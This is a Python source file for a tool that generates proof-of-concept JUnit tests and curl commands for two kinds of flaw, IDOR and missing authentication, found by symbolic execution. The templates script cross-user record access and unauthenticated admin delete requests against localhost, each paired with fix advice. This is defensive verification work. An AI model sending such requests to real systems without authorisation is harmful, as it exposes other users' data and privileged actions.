"""
PoC (Proof of Concept) Generator
Generates runnable exploit tests from symbolic execution proofs
"""

import json
import argparse
from pathlib import Path
from typing import Dict, Any, List
import sys

sys.path.insert(0, str(Path(__file__).parent.parent))

from app.core.symbolic_executor import ExploitProof, VulnerabilityType


class PoCGenerator:
    """Generates proof-of-concept exploits from symbolic execution results"""
    
    def __init__(self, output_dir: str = "./pocs"):
        """
        Initialize PoC generator
        
        Args:
            output_dir: Directory to save generated PoCs
        """
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True, parents=True)
    
    def generate_from_proof(self, proof: Dict[str, Any], test_name: str = None) -> str:
        """
        Generate PoC test from exploit proof
        
        Args:
            proof: Exploit proof dictionary
            test_name: Optional custom test name
            
        Returns:
            Path to generated test file
        """
        vuln_type = proof.get('vulnerability_type', 'unknown')
        
        if vuln_type == 'idor':
            return self._generate_idor_poc(proof, test_name)
        elif vuln_type in ['missing_authentication', 'missing_authorization']:
            return self._generate_auth_poc(proof, test_name)
        else:
            raise ValueError(f"Unsupported vulnerability type: {vuln_type}")
    
    def _generate_idor_poc(self, proof: Dict[str, Any], test_name: str = None) -> str:
        """Generate PoC for IDOR vulnerability"""
        attack_vector = proof.get('attack_vector', {})
        endpoint = attack_vector.get('endpoint', '/api/unknown')
        attacker_value = attack_vector.get('attacker_value', 999)
        victim_value = attack_vector.get('attacker_logged_in_as', 1)
        
        test_name = test_name or "testIDORExploit"
        
        # Generate JUnit test
        test_code = f'''package com.security.poc;

import org.junit.Test;
import org.junit.Before;
import static org.junit.Assert.*;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.springframework.boot.test.context.SpringBootTest;

/**
 * Proof of Concept: IDOR Vulnerability
 * Generated from symbolic execution proof
 * 
 * Confidence: {proof.get('confidence', 0) * 100:.1f}%
 * 
 * Attack Scenario:
 * {proof.get('proof', 'No description')}
 */
@SpringBootTest
public class IDORExploitTest {{
    
    private MockMvc mockMvc;
    
    @Before
    public void setup() {{
        // Setup test environment
        mockMvc = MockMvcBuilders.standaloneSetup(new UserController()).build();
    }}
    
    @Test
    public void {test_name}() throws Exception {{
        // Step 1: Attacker logs in as user {victim_value}
        String attackerToken = loginAsUser({victim_value});
        
        // Step 2: Attacker attempts to access user {attacker_value}'s data
        // This should fail with 403 Forbidden, but doesn't (VULNERABILITY)
        MvcResult result = mockMvc.perform(
            get("{endpoint}/" + {attacker_value})
                .header("Authorization", "Bearer " + attackerToken)
        ).andReturn();
        
        // VULNERABILITY: Should return 403, but returns 200
        int status = result.getResponse().getStatus();
        assertEquals("IDOR vulnerability: endpoint returns data without authorization check",
                    403, status);  // Expected: 403, Actual: 200
        
        // Verify attacker can see victim's data
        String responseBody = result.getResponse().getContentAsString();
        assertTrue("Attacker accessed unauthorized data", 
                  responseBody.contains("userId\":\"" + {attacker_value}));
    }}
    
    @Test
    public void testSecureVersion() throws Exception {{
        // This is how it SHOULD work with proper authorization
        String attackerToken = loginAsUser({victim_value});
        
        // Implement authorization check before data access:
        // if (!userId.equals(currentUser.getId())) {{
        //     throw new AccessDeniedException();
        // }}
        
        MvcResult result = mockMvc.perform(
            get("{endpoint}/" + {attacker_value})
                .header("Authorization", "Bearer " + attackerToken)
        ).andReturn();
        
        // With proper authorization, this should return 403
        assertEquals(403, result.getResponse().getStatus());
    }}
    
    /**
     * Fix Recommendation:
     * {proof.get('missing_check', 'Add authorization check')}
     */
    private String loginAsUser(int userId) {{
        // Mock login implementation
        return "mock-token-user-" + userId;
    }}
}}
'''
        
        # Save to file
        output_file = self.output_dir / f"{test_name}.java"
        output_file.write_text(test_code)
        
        print(f"Generated IDOR PoC: {output_file}")
        return str(output_file)
    
    def _generate_auth_poc(self, proof: Dict[str, Any], test_name: str = None) -> str:
        """Generate PoC for missing authentication vulnerability"""
        attack_vector = proof.get('attack_vector', {})
        endpoint = attack_vector.get('endpoint', '/api/unknown')
        
        test_name = test_name or "testMissingAuthExploit"
        
        # Generate JUnit test
        test_code = f'''package com.security.poc;

import org.junit.Test;
import org.junit.Before;
import static org.junit.Assert.*;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;

/**
 * Proof of Concept: Missing Authentication
 * Generated from symbolic execution proof
 * 
 * Confidence: {proof.get('confidence', 0) * 100:.1f}%
 * 
 * Attack Scenario:
 * {proof.get('proof', 'No description')}
 */
public class MissingAuthExploitTest {{
    
    private MockMvc mockMvc;
    
    @Before
    public void setup() {{
        mockMvc = MockMvcBuilders.standaloneSetup(new AdminController()).build();
    }}
    
    @Test
    public void {test_name}() throws Exception {{
        // Attempt to access sensitive endpoint WITHOUT authentication
        // This should fail with 401 Unauthorized, but doesn't (VULNERABILITY)
        MvcResult result = mockMvc.perform(
            post("{endpoint}")
                // No Authorization header
                .content("{{\\"action\\": \\"delete\\"}}")
                .contentType("application/json")
        ).andReturn();
        
        // VULNERABILITY: Should return 401, but returns 200
        int status = result.getResponse().getStatus();
        assertEquals("Missing authentication: endpoint accessible without auth",
                    401, status);  // Expected: 401, Actual: 200
    }}
    
    @Test
    public void testSecureVersion() throws Exception {{
        // This is how it SHOULD work with proper authentication
        // Add annotation: @PreAuthorize("isAuthenticated()")
        
        MvcResult result = mockMvc.perform(
            post("{endpoint}")
                .content("{{\\"action\\": \\"delete\\"}}")
                .contentType("application/json")
        ).andReturn();
        
        // With proper authentication requirement, this should return 401
        assertEquals(401, result.getResponse().getStatus());
    }}
    
    /**
     * Fix Recommendation:
     * {proof.get('missing_check', 'Add authentication requirement')}
     */
}}
'''
        
        # Save to file
        output_file = self.output_dir / f"{test_name}.java"
        output_file.write_text(test_code)
        
        print(f"Generated Missing Auth PoC: {output_file}")
        return str(output_file)
    
    def generate_from_analysis_results(self, results_file: str) -> List[str]:
        """
        Generate PoCs from semantic analysis results file
        
        Args:
            results_file: Path to analysis results JSON
            
        Returns:
            List of generated PoC file paths
        """
        with open(results_file, 'r') as f:
            results = json.load(f)
        
        generated_files = []
        vulnerabilities = results.get('vulnerabilities', [])
        
        for idx, vuln in enumerate(vulnerabilities):
            # Only generate for symbolically verified findings
            if not vuln.get('symbolically_verified', False):
                continue
            
            exploit_proof = vuln.get('exploit_proof')
            if not exploit_proof:
                continue
            
            try:
                test_name = f"test{vuln['vulnerability_type'].capitalize()}_{idx}"
                poc_file = self.generate_from_proof(exploit_proof, test_name)
                generated_files.append(poc_file)
            except Exception as e:
                print(f"Error generating PoC for vulnerability {idx}: {e}")
        
        return generated_files
    
    def generate_curl_commands(self, proof: Dict[str, Any]) -> str:
        """
        Generate curl commands to reproduce the exploit
        
        Args:
            proof: Exploit proof dictionary
            
        Returns:
            Curl commands as string
        """
        attack_vector = proof.get('attack_vector', {})
        endpoint = attack_vector.get('endpoint', '/api/unknown')
        method = attack_vector.get('method', 'GET')
        
        vuln_type = proof.get('vulnerability_type', 'unknown')
        
        if vuln_type == 'idor':
            attacker_value = attack_vector.get('attacker_value', 999)
            victim_value = attack_vector.get('attacker_logged_in_as', 1)
            
            return f'''# IDOR Exploit using curl

# 1. Login as user {victim_value} (attacker)
curl -X POST http://localhost:8080/api/login \\
  -H "Content-Type: application/json" \\
  -d '{{"userId": "{victim_value}", "password": "password"}}' \\
  -c cookies.txt

# 2. Access user {attacker_value}'s data (victim)
# This should fail but doesn't (VULNERABILITY)
curl -X {method} http://localhost:8080{endpoint}/{attacker_value} \\
  -b cookies.txt

# Expected: 403 Forbidden
# Actual: 200 OK with victim's data
'''
        
        elif 'auth' in vuln_type:
            return f'''# Missing Authentication Exploit using curl

# Access sensitive endpoint WITHOUT authentication
curl -X {method} http://localhost:8080{endpoint} \\
  -H "Content-Type: application/json" \\
  -d '{{"action": "sensitive_operation"}}'

# Expected: 401 Unauthorized
# Actual: 200 OK (VULNERABILITY)
'''
        
        return "# No curl commands available for this vulnerability type"


def main():
    """CLI entry point"""
    parser = argparse.ArgumentParser(description='Generate PoC exploits from symbolic execution proofs')
    parser.add_argument('results_file', help='Path to analysis results JSON file')
    parser.add_argument('--output-dir', default='./pocs', help='Output directory for generated PoCs')
    parser.add_argument('--curl', action='store_true', help='Also generate curl commands')
    
    args = parser.parse_args()
    
    generator = PoCGenerator(output_dir=args.output_dir)
    
    print(f"Generating PoCs from {args.results_file}...")
    generated_files = generator.generate_from_analysis_results(args.results_file)
    
    print(f"\nGenerated {len(generated_files)} PoC test(s):")
    for file_path in generated_files:
        print(f"  - {file_path}")
    
    if args.curl and generated_files:
        print("\n" + "="*60)
        print("CURL Commands:")
        print("="*60)
        
        # Read results and generate curl for each proof
        with open(args.results_file, 'r') as f:
            results = json.load(f)
        
        for vuln in results.get('vulnerabilities', []):
            if vuln.get('symbolically_verified') and vuln.get('exploit_proof'):
                print(generator.generate_curl_commands(vuln['exploit_proof']))
                print()


if __name__ == "__main__":
    main()
